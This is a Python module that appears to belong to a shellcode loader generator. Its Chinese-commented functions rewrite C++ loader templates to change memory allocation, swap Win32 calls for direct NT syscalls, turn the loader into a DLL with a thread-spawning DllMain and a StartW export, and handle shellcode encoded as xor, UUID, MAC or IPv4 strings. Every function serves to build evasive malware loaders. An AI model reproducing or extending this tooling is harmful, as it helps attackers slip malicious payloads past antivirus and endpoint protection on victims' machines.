#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2022-02-26 12:15:52
# @Author  : Your Name (you@example.org)
# @Link    : http://example.org
# @Version : $Id$

import re


def GetTemplateContent(callback):
	'''
    获取Callback模版函数
    :: param: string -> callback
    :: return: tuple -> (TemplateContent, lib)
    '''

	TemplateContent = open('template/' + callback + '.cpp').read()

	Libmatch = re.findall('\#pragma comment\(lib, \".*?lib\"\)', TemplateContent)
	if Libmatch:
		TemplateContent = TemplateContent.replace(Libmatch[0], '')
		lib = './lib/' + re.findall('"(.*?)"', Libmatch[0])[0]
	else:
		lib = ''

	return TemplateContent, lib


def alloc(AllocMethod, cppContent):

	AllocMethodDict = {
		'VirtualAlloc':'LPVOID addr = VirtualAlloc(NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE);',
		'HeapAlloc':'LPVOID addr = HeapAlloc(HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0), 0, sizeof(Ciphertext));'
	}

	if AllocMethod != 'VirtualAllocExNuma':
		cppContent = cppContent.replace('LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);', AllocMethodDict[AllocMethod])

	return cppContent


def todll(cppContent):
	'''
    添加dllmain及StartW函数
    :: param: string -> cppContent
    :: return: string -> cppContent
    '''

	cppContent = cppContent.replace('int main() {', 'DWORD ThreadProc(LPVOID param) {')
	cppContent += '''

BOOL WINAPI DllMain (HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
	switch (dwReason) {
		case DLL_PROCESS_ATTACH:
			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&ThreadProc, (LPVOID)NULL, 0, NULL);
		break;
	}
	return TRUE;
}

void CALLBACK StartW(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow) {
	while (TRUE)
		Sleep(60 * 1000);
}
	'''
	return cppContent


def syscall(cppContent):
	'''
    替换Syscall函数
    :: param: string -> cppContent
    :: return: string -> cppContent
    '''

	cppContent = cppContent.replace('LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);', 'PVOID addr = NULL;\n\tSIZE_T sDataSize = sizeof(Ciphertext);\n\tNTSTATUS NTAVM = NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &sDataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);')
	cppContent = cppContent.replace('DWORD pflOldProtect;\n\tVirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);', 'DWORD oldprotect = 0;\n\tNTSTATUS NTPVM = NtProtectVirtualMemory(GetCurrentProcess(), &addr, &sDataSize, PAGE_EXECUTE_READ, &oldprotect);')
	return cppContent


def EncryptCompileTrim(cppContent, EncryptType):

	if EncryptType == 'xor':
		cppContent = cppContent.replace('#include "base64.h"', '')

	elif EncryptType == 'uuid':
		cppContent = cppContent.replace('#include "base64.h"', '')
		cppContent = cppContent.replace('char Ciphertext[] = "<Ciphertext>";', 'const char* Ciphertext[] = {<Ciphertext>};').replace('RtlMoveMemory(addr, shellcode, sizeof(Ciphertext));\n', '').replace('memcpy(addr, &shellcode[0], sizeof(Ciphertext));\n','')
		
	elif EncryptType == 'mac':
		cppContent = cppContent.replace('#include "base64.h"', '#include "ip2string.h"')
		cppContent = cppContent.replace('char Ciphertext[] = "<Ciphertext>";', 'const char* Ciphertext[] = {<Ciphertext>};').replace('RtlMoveMemory(addr, shellcode, sizeof(Ciphertext));\n', '').replace('memcpy(addr, &shellcode[0], sizeof(Ciphertext));\n','')
		
	elif EncryptType == 'ipv4':
		cppContent = cppContent.replace('#include "base64.h"', '#include "ip2string.h"')
		cppContent = cppContent.replace('char Ciphertext[] = "<Ciphertext>";', 'const char* Ciphertext[] = {<Ciphertext>};').replace('RtlMoveMemory(addr, shellcode, sizeof(Ciphertext));\n', '').replace('memcpy(addr, &shellcode[0], sizeof(Ciphertext));\n','')

	return cppContent


